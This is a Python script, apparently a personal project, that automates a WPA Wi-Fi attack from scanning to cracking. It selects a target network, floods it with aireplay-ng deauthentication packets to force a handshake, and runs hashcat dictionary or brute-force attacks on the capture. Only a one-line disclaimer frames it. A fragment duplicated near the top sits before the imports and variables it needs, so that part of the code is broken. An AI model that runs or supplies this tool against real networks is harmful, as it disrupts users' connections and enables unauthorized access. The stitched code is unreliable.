#Done

#!/usr/bin/env python3
# Disclaimer: This script is for educational purposes only. Do not use against any network that you don't own or have authorization to test.

import subprocess
import re
import csv
import os
import time
import shutil
    # Export to additional hash formats (for CrackStation compatibility example, though not standard for WPA)
    md5_output = f"{cap_file_base}_md5.hash"
    sha1_output = f"{cap_file_base}_sha1.hash"
    # Placeholder example: generating MD5 and SHA1 hashes of the .22000 file content
    # Caution: This is not WPA cracking compatible directly with CrackStation
    with open(converted_file, 'rb') as f:
        data = f.read()
        md5_hash = hashlib.md5(data).hexdigest()
        sha1_hash = hashlib.sha1(data).hexdigest()

    # Write hashes to respective files
    with open(md5_output, 'w') as f:
        f.write(md5_hash)
    with open(sha1_output, 'w') as f:
        f.write(sha1_hash)
    
    print(f"MD5 hash saved to {md5_output}")
    print(f"SHA1 hash saved to {sha1_output}")


import hashlib
from datetime import datetime

# Empty list where all active wireless networks will be saved.
active_wireless_networks = []

def check_for_essid(essid, lst):
    """ Check if ESSID is already in the list of active networks. """
    if essid is None:
        return False
    for item in lst:
        if essid in item["ESSID"]:
            return False
    return True

# Display header
print(r"""
 /$$   /$$           /$$       /$$ /$$                        /$$$$$$                                /$$                
| $$  | $$          | $$      |__/| $$                       /$$__  $$                              | $$                
| $$  | $$  /$$$$$$$| $$$$$$$  /$$| $$$$$$$   /$$$$$$       | $$  \__/  /$$$$$$   /$$$$$$$ /$$   /$$| $$   /$$  /$$$$$$ 
| $$  | $$ /$$_____/| $$__  $$| $$| $$__  $$ |____  $$      |  $$$$$$  /$$__  $$ /$$_____/| $$  | $$| $$  /$$/ /$$__  $$
| $$  | $$| $$      | $$  \ $$| $$| $$  \ $$  /$$$$$$$       \____  $$| $$  \ $$|  $$$$$$ | $$  | $$| $$$$$$/ | $$$$$$$$
| $$  | $$| $$      | $$  | $$| $$| $$  | $$ /$$__  $$       /$$  \ $$| $$  | $$ \____  $$| $$  | $$| $$_  $$ | $$_____/
|  $$$$$$/|  $$$$$$$| $$  | $$| $$| $$  | $$|  $$$$$$$      |  $$$$$$/|  $$$$$$/ /$$$$$$$/|  $$$$$$/| $$ \  $$|  $$$$$$$
 \______/  \_______/|__/  |__/|__/|__/  |__/ \_______/       \______/  \______/ |_______/  \______/ |__/  \__/ \_______/
                                                                                                                        
                                                                                                                        
                                                                                                                        """)
print("\n****************************************************************")
print("\n* Copyright of Uchiha Sosuke, 2024                              *")
print("\n* https://github.com/uchihasosuke?tab=repositories                                 *")
print("\n****************************************************************")

# Ensure script is run with sudo privileges
if not 'SUDO_UID' in os.environ.keys():
    print("Run this program with sudo.")
    exit()

# Create backup folder if it doesn't exist
backup_dir = os.path.join(os.getcwd(), "backup")
os.makedirs(backup_dir, exist_ok=True)

# Backup existing .csv files
for file_name in os.listdir():
    if file_name.endswith(".csv"):
        print(f"Moving existing {file_name} to backup folder.")
        timestamp = datetime.now()
        try:
            shutil.move(file_name, f"{backup_dir}/{timestamp}-{file_name}")
        except FileNotFoundError:
            print(f"File {file_name} not found. Skipping.")

# Regex to find wireless interfaces
wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
if len(check_wifi_result) == 0:
    print("Connect a WiFi controller and try again.")
    exit()

# List WiFi interfaces
print("Available WiFi interfaces:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Select WiFi interface
while True:
    wifi_interface_choice = input("Select the interface for packet capture: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Invalid choice. Enter a number corresponding to the options.")

hacknic = check_wifi_result[int(wifi_interface_choice)]
print("Killing conflicting processes.")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])
print("Putting WiFi adapter into monitor mode.")
subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Capture access points
print("Scanning for access points. Press Ctrl+C to stop.")
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "network_capture", "--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if file_name.endswith(".csv"):
                with open(file_name) as csv_h:
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID" or row["BSSID"] == "Station MAC" or row["ESSID"] is None:
                            continue
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)
        
        print("Scanning. Press Ctrl+C to select a target.\n")
        print("No |\tBSSID              |\tChannel|\tESSID")
        print("___|\t___________________|\t_______|\t___________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nReady to select a target.")

# Select target network
while True:
    choice = input("Select the network to attack: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Invalid choice. Try again.")

# Set variables for selected network
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()




# Switch to target channel
print(f"Setting WiFi adapter to channel {hackchannel}.")
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Generate a unique filename for each Wi-Fi network based on BSSID
cap_file_base = f"handshake_capture_{hackbssid.replace(':', '')}"
cap_file = f"{cap_file_base}-01.cap"

# Start airodump-ng for live monitoring and handshake capture
print("Starting packet capture for handshake. Press Ctrl+C to stop once handshake is detected.")
capture_command = [
    "airodump-ng", "--bssid", hackbssid, "-c", hackchannel, "-w", cap_file_base, hacknic + "mon"
]

try:
    # Start airodump-ng in a separate process
    capture_handshake = subprocess.Popen(capture_command)

    # Start deauthentication attack loop to periodically trigger deauthentication
    print("Starting periodic deauthentication attack to capture handshake.")
    deauth_attack_active = True

    def deauth_attack():
        while deauth_attack_active:
            subprocess.run(["aireplay-ng", "--deauth", "10", "-a", hackbssid, hacknic + "mon"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)  # Pause before next deauthentication burst

    # Run deauthentication in a separate thread
    import threading
    deauth_thread = threading.Thread(target=deauth_attack)
    deauth_thread.start()

    # Monitor for a valid handshake in the unique .cap file
    handshake_captured = False
    while not handshake_captured:
        if os.path.exists(cap_file):
            # Check if handshake details are in the capture file
            check_handshake = subprocess.run(
                ["hcxpcapngtool", "-o", f"{cap_file_base}.22000", cap_file],
                capture_output=True,
                text=True
            )
            if "EAPOL M1 messages" in check_handshake.stdout and "EAPOL pairs (best)" in check_handshake.stdout:
                print(f"Handshake captured in {cap_file}")
                handshake_captured = True

        time.sleep(2)  # Wait and recheck for handshake

    # Stop airodump-ng and deauthentication attack after handshake is captured
    capture_handshake.terminate()
    deauth_attack_active = False
    deauth_thread.join()

    # Convert the captured handshake to .22000 format with a unique filename
    converted_file = f"{cap_file_base}.22000"
    subprocess.run(["hcxpcapngtool", "-o", converted_file, cap_file])
    print(f"Converted handshake file to {converted_file}")
    

    # Export to additional hash formats (for CrackStation compatibility example, though not standard for WPA)
    md5_output = f"{cap_file_base}_md5.hash"
    sha1_output = f"{cap_file_base}_sha1.hash"
    # Placeholder example: generating MD5 and SHA1 hashes of the .22000 file content
    # Caution: This is not WPA cracking compatible directly with CrackStation
    with open(converted_file, 'rb') as f:
        data = f.read()
        md5_hash = hashlib.md5(data).hexdigest()
        sha1_hash = hashlib.sha1(data).hexdigest()

    # Write hashes to respective files
    with open(md5_output, 'w') as f:
        f.write(md5_hash)
    with open(sha1_output, 'w') as f:
        f.write(sha1_hash)
    
    print(f"MD5 hash saved to {md5_output}")
    print(f"SHA1 hash saved to {sha1_output}")

    

    # Prompt user to choose between dictionary or brute-force attack
    print("Handshake capture complete. Select attack method:")
    print("1 - Dictionary Attack")
    print("2 - Brute-force Attack")
    attack_choice = input("Enter 1 or 2: ")

    if attack_choice == "1":
        print(f"Running dictionary attack on {converted_file}")
        subprocess.run(["hashcat", "-m", "22000", converted_file, "/usr/share/wordlists/rockyou.txt", "-w", "2", "--potfile-disable"])

    elif attack_choice == "2":
        print(f"Running brute-force attack on {converted_file}")
        subprocess.run([
            "hashcat", "-m", "22000", converted_file, "-a", "3", "?a?a?a?a?a?a?a?a", 
            "-w", "2", "--increment", "--status", "--potfile-disable"
        ])

except KeyboardInterrupt:
    print("\nStopping capture and exiting monitor mode.")
    capture_handshake.terminate()
    deauth_attack_active = False
    deauth_thread.join()

# Cleanup: Stop monitor mode and restart network services
subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
subprocess.run(["service", "NetworkManager", "restart"])
print("see above for pass if cracked.")
print("WiFi service restarted. Capture and processing complete.")

